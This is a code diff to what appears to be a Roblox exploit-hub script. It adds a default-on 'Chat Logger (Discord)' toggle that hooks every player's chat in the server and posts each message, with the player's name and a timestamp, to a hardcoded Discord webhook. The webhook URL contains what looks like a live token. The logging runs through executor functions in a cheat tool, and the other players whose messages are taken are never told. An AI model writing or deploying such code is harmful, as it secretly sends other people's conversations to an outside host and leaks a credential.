@@ -3572,3 +3572,114 @@ CombatGroup:AddButton({
         end
     end
 })
+
+local CombatGroup = Tabs.Combat:AddLeftGroupbox("Combat Settings")
+
+-- Tüm bağlantıları saklamak için
+local chatLoggerConnections = {}
+local chatLoggerRunning = false
+
+local function StartChatLogger()
+    if chatLoggerRunning then return end
+    chatLoggerRunning = true
+
+    task.spawn(function()
+        repeat task.wait() until game:IsLoaded()
+
+        local Players = game:GetService("Players")
+        local HttpService = game:GetService("HttpService")
+        local StarterGui = game:GetService("StarterGui")
+
+        local WEBHOOK_URL = "https://discord.com/api/webhooks/1428004629890994207/Y4a9rcV5V0CmmqxfOe3OPAX8bDtI_gVtE313Wnk-moyGCqrejfpyQxQwpA6XUA4lnXUe"
+
+        local function sendWebhook(content)
+            local data = {
+                username = "Roblox Chat Logger",
+                content = content
+            }
+
+            local json = HttpService:JSONEncode(data)
+
+            local success, err = pcall(function()
+                if syn and syn.request then
+                    syn.request({
+                        Url = WEBHOOK_URL,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = json
+                    })
+                elseif http_request then
+                    http_request({
+                        Url = WEBHOOK_URL,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = json
+                    })
+                else
+                    HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson)
+                end
+            end)
+
+            if not success then
+                warn("[ChatLogger] Webhook gönderimi başarısız:", err)
+            end
+        end
+
+        local function onChatted(player, message)
+            if message and message:match("%S") then -- boş değilse
+                local log = string.format("[%s] %s: %s", os.date("%X"), player.Name, message)
+                sendWebhook(log)
+                print(log)
+            end
+        end
+
+        local function connectPlayer(player)
+            local conn = player.Chatted:Connect(function(msg)
+                onChatted(player, msg)
+            end)
+            table.insert(chatLoggerConnections, conn)
+        end
+
+        for _, player in ipairs(Players:GetPlayers()) do
+            connectPlayer(player)
+        end
+
+        local playerAddConn = Players.PlayerAdded:Connect(connectPlayer)
+        table.insert(chatLoggerConnections, playerAddConn)
+
+        if _G.OpenConsole then
+            pcall(function()
+                StarterGui:SetCore("DevConsoleVisible", true)
+            end)
+        end
+
+        print("[ChatLogger] Aktif edildi.")
+    end)
+end
+
+local function StopChatLogger()
+    for _, conn in ipairs(chatLoggerConnections) do
+        pcall(function()
+            conn:Disconnect()
+        end)
+    end
+    table.clear(chatLoggerConnections)
+    chatLoggerRunning = false
+    print("[ChatLogger] Devre dışı bırakıldı.")
+end
+
+-- Toggle butonu (varsayılan aktif)
+CombatGroup:AddToggle("ChatLogger", {
+    Text = "Chat Logger (Discord)",
+    Default = true,
+    Tooltip = "Oyuncuların sohbetlerini Discord Webhook'a yollar.",
+    Callback = function(enabled)
+        if enabled then
+            StartChatLogger()
+            Library:Notify("✅ Chat Logger aktif edildi.")
+        else
+            StopChatLogger()
+            Library:Notify("❌ Chat Logger durduruldu.")
+        end
+    end
+})
